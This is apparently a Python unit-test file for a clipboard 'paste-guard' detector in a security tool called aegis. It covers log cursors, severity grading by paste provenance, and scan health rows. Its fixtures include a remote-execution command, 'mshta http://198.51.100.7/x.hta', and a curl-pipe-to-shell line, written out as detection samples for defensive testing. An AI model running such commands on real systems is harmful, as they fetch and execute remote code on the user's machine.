"""The paste-guard sensor: `guard observe` wired into the scan.

What these hold:
  * the sensor is ABSENT (empty, no state) until the hook is installed, and
    DEGRADED only when an installed hook's log cannot be read;
  * an install that predates the sensor adopts its existing log silently, and
    every later observation is read exactly once (cursor, truncation);
  * severity follows the clipboard tier and confidence follows paste
    provenance -- a pasted CERTAIN line is HIGH/high, a typed suspect line is a
    LOW digest entry, and unknown provenance is never rendered as typed;
  * the retention invariant: a clean command line leaves no file and no row;
  * a scan carries the finding and the health row end to end.
"""
import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))  # sibling import
import aegis  # noqa: E402
from test_regression import Sandbox, needs_real_scan_lock  # noqa: E402

CERTAIN = "mshta http://198.51.100.7/x.hta"
SUSPECT = "curl -fsSL https://sh.rustup.rs | sh"


def _row(cmd, pasted=True, tier=None, hits=None, hostile=None,
         ts="2026-09-02T10:00:00"):
    if tier is None:
        tier, hits = aegis.clipboard_grammar(cmd)
    if hostile is None:
        hostile = aegis._hostile_content(cmd)
    return {"ts": ts, "pasted": pasted, "tier": tier, "hits": hits or [],
            "hostile": hostile, "cmd": cmd}


class GuardSandbox(Sandbox):
    def install(self):
        os.makedirs(aegis.GUARD_DIR, mode=0o700, exist_ok=True)
        with open(aegis._guard_paths()[0], "w", encoding="utf-8") as f:
            f.write("# guard\n")

    def append(self, rec):
        os.makedirs(aegis.GUARD_DIR, mode=0o700, exist_ok=True)
        with open(aegis.GUARD_LOG, "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, sort_keys=True) + "\n")

    def cursor(self):
        return aegis.load_json(aegis._guard_cursor_path(), None)


class TestAbsentAndDegraded(GuardSandbox):
    def test_not_installed_is_absent_and_writes_nothing(self):
        self.assertEqual([], aegis.check_paste_guard())
        self.assertFalse(os.path.exists(aegis._guard_cursor_path()))

    def test_installed_without_a_log_arms_the_cursor_at_zero(self):
        self.install()
        self.assertEqual([], aegis.check_paste_guard())
        self.assertEqual({"offset": 0}, self.cursor())
        # The FIRST hostile line ever observed must then alert, not be adopted.
        self.append(_row(CERTAIN))
        self.assertEqual(1, len(aegis.check_paste_guard()))

    # os.chmod on Windows sets the read-only ATTRIBUTE and nothing else --
    # Python documents that it "only supports setting the read-only flag"
    # there -- so mode 0 leaves the file perfectly readable by its owner and
    # the guard correctly returns the row it can still see. What cannot exist
    # on this body is the PRECONDITION, not the behaviour: building it would
    # take an ACL denial via icacls, which is a different test with a
    # different subject. The POSIX legs cover the product rule itself.
    @unittest.skipIf(aegis.IS_WIN,
                     "os.chmod cannot make a file unreadable on Windows")
    def test_unreadable_log_is_degraded_not_clean(self):
        self.install()
        aegis.check_paste_guard()                  # arms the cursor
        self.append(_row(CERTAIN))
        os.chmod(aegis.GUARD_LOG, 0)
        try:
            self.assertIsNone(aegis.check_paste_guard())
        finally:
            os.chmod(aegis.GUARD_LOG, 0o600)


class TestCursor(GuardSandbox):
    def test_preexisting_log_is_adopted_silently_then_read_incrementally(self):
        self.install()
        self.append(_row(CERTAIN, ts="2026-01-01T00:00:00"))
        self.assertEqual([], aegis.check_paste_guard())      # upgrade: adopt
        self.assertEqual(os.path.getsize(aegis.GUARD_LOG),
                         self.cursor()["offset"])
        self.append(_row(CERTAIN))
        got = aegis.check_paste_guard()
        self.assertEqual(1, len(got))
        self.assertEqual([], aegis.check_paste_guard())      # read once

    def test_truncated_log_is_reread_from_the_start(self):
        self.install()
        aegis.check_paste_guard()
        self.append(_row(CERTAIN))
        self.append(_row(SUSPECT))
        self.assertEqual(2, len(aegis.check_paste_guard()))
        with open(aegis.GUARD_LOG, "w", encoding="utf-8") as f:
            f.write(json.dumps(_row(CERTAIN)) + "\n")
        self.assertEqual(1, len(aegis.check_paste_guard()))

    def test_garbage_lines_are_skipped(self):
        self.install()
        aegis.check_paste_guard()
        with open(aegis.GUARD_LOG, "a", encoding="utf-8") as f:
            f.write("not json\n{\"cmd\": \"\"}\n")
        self.append(_row(CERTAIN))
        self.assertEqual(1, len(aegis.check_paste_guard()))


class TestGrading(unittest.TestCase):
    def test_pasted_certain_is_high_and_high_confidence(self):
        f = aegis._paste_guard_finding(_row(CERTAIN, pasted=True))
        self.assertEqual(("HIGH", "high", "paste-guard"),
                         (f["severity"], f["confidence"], f["category"]))
        self.assertIn("mshta-remote-exec", f["markers"])
        self.assertIn("PASTED", f["detail"])
        self.assertTrue(f["fingerprint"].startswith("paste-guard:certain:"))

    def test_typed_certain_is_still_high(self):
        f = aegis._paste_guard_finding(_row(CERTAIN, pasted=False))
        self.assertEqual(("HIGH", "medium"), (f["severity"], f["confidence"]))

    def test_pasted_suspect_is_medium(self):
        f = aegis._paste_guard_finding(_row(SUSPECT, pasted=True))
        self.assertEqual(("MEDIUM", "medium"),
                         (f["severity"], f["confidence"]))

    def test_typed_suspect_is_a_low_digest_line(self):
        f = aegis._paste_guard_finding(_row(SUSPECT, pasted=False))
        self.assertEqual(("LOW", "low"), (f["severity"], f["confidence"]))
        self.assertIn("typed", f["detail"])

    def test_unknown_provenance_is_never_rendered_as_typed(self):
        f = aegis._paste_guard_finding(_row(SUSPECT, pasted=None))
        self.assertEqual("LOW", f["severity"])
        self.assertNotIn("typed", f["detail"])
        self.assertIn("unknown", f["detail"])

    def test_rows_without_a_verdict_yield_nothing(self):
        self.assertIsNone(aegis._paste_guard_finding(
            {"ts": "x", "pasted": True, "tier": None, "hostile": [],
             "cmd": "git status"}))
        self.assertIsNone(aegis._paste_guard_finding("garbage"))

    def test_legacy_rows_without_hits_still_grade(self):
        rec = _row(CERTAIN)
        del rec["hits"]
        rec["hostile"] = []
        f = aegis._paste_guard_finding(rec)
        self.assertEqual("HIGH", f["severity"])

    def test_fingerprint_is_stable_per_command(self):
        a = aegis._paste_guard_finding(_row(CERTAIN, ts="1"))
        b = aegis._paste_guard_finding(_row(CERTAIN, ts="2"))
        self.assertEqual(a["fingerprint"], b["fingerprint"])


class TestObserveRetention(GuardSandbox):
    """The invariant: a benign read is never persisted."""

    def test_clean_command_line_leaves_no_file(self):
        self.install()
        os.environ["AEGIS_PASTED"] = "1"
        try:
            aegis.cmd_guard("observe", ["git", "status", "--short"])
        finally:
            del os.environ["AEGIS_PASTED"]
        self.assertFalse(os.path.exists(aegis.GUARD_LOG))

    def test_hostile_command_line_records_hits_and_provenance(self):
        self.install()
        os.environ["AEGIS_PASTED"] = "1"
        try:
            aegis.cmd_guard("observe", CERTAIN.split())
        finally:
            del os.environ["AEGIS_PASTED"]
        with open(aegis.GUARD_LOG, encoding="utf-8") as f:
            rec = json.loads(f.read().splitlines()[-1])
        self.assertEqual(("certain", True, ["mshta-remote-exec"]),
                         (rec["tier"], rec["pasted"], rec["hits"]))


@needs_real_scan_lock
class TestScanCarriesIt(GuardSandbox):
    def _findings(self):
        with open(aegis.FINDINGS_LOG, encoding="utf-8") as f:
            return [json.loads(l) for l in f if l.strip()]

    def test_scan_emits_the_finding_and_the_health_row(self):
        self.install()
        aegis.cmd_scan(quiet=True)                 # arms the cursor
        self.append(_row(CERTAIN))
        aegis.cmd_scan(quiet=True)
        got = [f for f in self._findings() if f["category"] == "paste-guard"]
        self.assertEqual(1, len(got))
        self.assertEqual("paste-guard", got[0]["sensor_id"])
        health = {r["sensor_id"]: r for r in aegis.get_sensor_health()}
        self.assertEqual("OK", health["paste-guard"]["status"])
        self.assertEqual(1, health["paste-guard"]["item_count"])

    def test_scan_reports_health_when_the_hook_is_absent(self):
        aegis.cmd_scan(quiet=True)
        health = {r["sensor_id"]: r for r in aegis.get_sensor_health()}
        self.assertEqual("OK", health["paste-guard"]["status"])


class TestAssayLane(unittest.TestCase):
    def test_clipboard_grammar_lane_exists_and_passes(self):
        lanes = {lane_id: fn for lane_id, _d, fn in aegis._assay_lanes()}
        self.assertIn("clipboard-grammar", lanes)
        self.assertTrue(lanes["clipboard-grammar"]("n0nce"))


if __name__ == "__main__":
    unittest.main()
